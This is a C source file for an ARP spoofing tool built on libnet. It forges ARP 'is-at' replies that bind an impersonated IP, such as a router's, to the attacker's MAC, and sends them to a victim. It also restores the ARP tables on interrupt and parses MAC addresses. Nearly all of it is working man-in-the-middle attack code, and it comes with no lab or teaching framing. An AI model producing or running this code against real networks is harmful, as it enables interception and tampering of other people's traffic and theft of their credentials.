#include"arpSpoof.h"

// -------------------------------------------------------------
// Core ARP Spoofing Logic
// -------------------------------------------------------------

void arp_spoof(device *fake_source, device *destination, const uint8_t *attacker_mac_addr, 
               const char *iface) {


    // 1. Build the ARP header (the data we are sending)
    libnet_ptag_t arp_tag = libnet_build_arp(
        ARPHRD_ETHER,           /* hardware type */
        ETHERTYPE_IP,           /* protocol type */
        HARDWARE_ADDR_SIZE,     /* hardware addr size */
        PROTOCOL_ADDR_SIZE,     /* protocol addr size */
        ARPOP_REPLY,            /* ARP operation type ("is-at") */
        attacker_mac_addr,      /* sender hardware address (our MAC) */
        (uint8_t *)&fake_source->ip_addr,     /* sender protocol address (impersonated IP) */
        destination->mac_addr,               /* target hardware address (victim's MAC) */
        (uint8_t *)&destination->ip_addr,     /* target protocol address (victim's IP) */
        NULL,                   /* payload */
        0,                      /* payload size */
        l,                      /* libnet context */
        0                       /* protocol tag */
    );

    if (arp_tag == -1) {
        fprintf(stderr, "Error building ARP header: %s\n", libnet_geterror(l));
        return;
    }

    // 2. Build the Ethernet header (the frame carrying the ARP packet)
    libnet_ptag_t eth_tag = libnet_build_ethernet(
        destination->mac_addr,  /* destination MAC */
        attacker_mac_addr,      /* source MAC (our MAC) */
        ETHERTYPE_ARP,          /* protocol type */
        NULL,                   /* payload */
        0,                      /* payload size */
        l,                      /* libnet context */
        0                       /* protocol tag */
    );
    if (eth_tag == -1) {
        fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
        return;
    }

    // 3. Inject the packet 
    int byte_written = libnet_write(l);
    if (byte_written == -1) {
        fprintf(stderr, "Warning: Packet injection failed: %s\n", libnet_geterror(l));
    } else {
        fprintf(stdout, "Sent %d byte ARP spoof packet to %s\n", byte_written, destination->readable_ip);
    }
    
    // Clear the internal buffer for the next packet
    libnet_clear_packet(l);
}

// -------------------------------------------------------------
// ARP Restoration
// -------------------------------------------------------------

void arp_restore(device *fake_source, device *destination) {
        
    // Loop to send multiple restoration packets
    for (int i = 0; i < TARGET_COUNT; i++) {
        // Build ARP header (Real MAC: source_mac_addr, Real IP: source_ip)
        libnet_ptag_t arp_tag = libnet_build_arp(
            ARPHRD_ETHER, 
            ETHERTYPE_IP,
            HARDWARE_ADDR_SIZE, 
            PROTOCOL_ADDR_SIZE, 
            ARPOP_REPLY, 
            fake_source->mac_addr, 
            (uint8_t *)&fake_source->ip_addr,
            destination->mac_addr, 
            (uint8_t *)&destination->ip_addr,
            NULL, 
            0, 
            l, 
            0
        );

        // Build Ethernet header
        libnet_ptag_t eth_tag = libnet_build_ethernet(
            destination->mac_addr, 
            fake_source->mac_addr, 
            ETHERTYPE_ARP, 
            NULL, 
            0, 
            l, 
            0
        );

        if (libnet_write(l) == -1) {
             fprintf(stderr, "Restore failed: %s\n", libnet_geterror(l));
        }
        libnet_clear_packet(l);
        usleep(50000); // 50ms delay between packets
    }
}

// -------------------------------------------------------------
// ARP Cleanup and exit
// -------------------------------------------------------------

void cleanup_and_exit(int signum) {
    fprintf(stdout, "\n[SIGINT] Restoring ARP Tables...\n");
    
    arp_restore(router, victim);
    
    arp_restore(victim, router);
    
    fprintf(stdout, "Restoration complete. Shutting down Libnet.\n");
    libnet_destroy(l);
    exit(0);
}


// -------------------------------------------------------------
// MAC Parsing
// -------------------------------------------------------------

int parse_mac(const char *mac_str, uint8_t *mac_array) {
    int ret = sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                     &mac_array[0], &mac_array[1], &mac_array[2],
                     &mac_array[3], &mac_array[4], &mac_array[5]);    
    return (ret == 6) ? 0 : -1;
}
